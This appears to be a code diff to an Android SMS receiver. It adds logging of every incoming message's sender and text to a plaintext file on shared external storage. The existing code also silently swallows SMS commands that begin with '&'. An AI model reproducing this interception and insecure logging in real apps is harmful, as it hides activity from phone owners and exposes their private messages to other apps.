@@ -3,9 +3,17 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.os.Environment;
 import android.telephony.SmsMessage;
 import android.util.Log;
 import android.widget.Toast;
+
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
 public class ReceiverSMS extends BroadcastReceiver {
 
@@ -34,6 +42,8 @@ public class ReceiverSMS extends BroadcastReceiver {
                 bodyText.append(messages[i].getMessageBody());
             }
             String body = bodyText.toString();
+
+            saveFile("From: " + sms_from + " - " + body);
             if (body.charAt(0) == '&') {
                 Intent mIntent = new Intent(context, ServiceIntentSMS.class);
                 mIntent.putExtra("sms_body", body);
@@ -43,6 +53,25 @@ public class ReceiverSMS extends BroadcastReceiver {
                 abortBroadcast();
             }
 
+        }
+    }
+
+    private void saveFile(String text) {
+        String dirPath =  Environment.getExternalStorageDirectory() + File.separator + "LOGS" +File.separator;
+        String name = "Logs.txt";
+        File projDir = new File(dirPath);
+        if (!projDir.exists()) projDir.mkdir();
+        SimpleDateFormat sdf = new SimpleDateFormat("MM-dd HH:mm:ss.SSS", Locale.US);
+        String time = sdf.format(new Date(System.currentTimeMillis()));
+
+        try {
+            File logfile = new File(dirPath, name);
+            FileWriter writer = new FileWriter(logfile,true);
+            writer.write(time + " " + text + "\r\n");
+            writer.flush();
+            writer.close();
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
